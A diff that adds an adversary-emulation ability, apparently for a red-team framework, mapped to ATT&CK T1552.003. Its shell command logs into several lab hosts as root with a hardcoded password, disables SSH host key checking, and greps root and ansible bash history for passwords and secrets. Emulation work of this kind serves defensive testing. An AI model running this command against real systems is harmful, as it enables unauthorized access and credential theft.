@@ -1,0 +1,15 @@
+- id: ca02-bash-history
+  name: Bash History Credential Mining
+  description: Read bash history files for plaintext passwords and credentials
+  tactic: credential-access
+  technique:
+    attack_id: T1552.003
+    name: Unsecured Credentials - Bash History
+  platforms:
+    linux:
+      sh:
+        command: |
+          for h in 10.0.20.10 10.0.20.21 10.0.20.30 10.0.20.40 10.0.20.200; do sshpass -p 'toor' ssh -o StrictHostKeyChecking=no root@$h 'cat /root/.bash_history /home/ansible/.bash_history 2>/dev/null | grep -iE "pass|key|secret|mysql|-p"' 2>/dev/null; done
+
+  singleton: false
+  repeatable: false
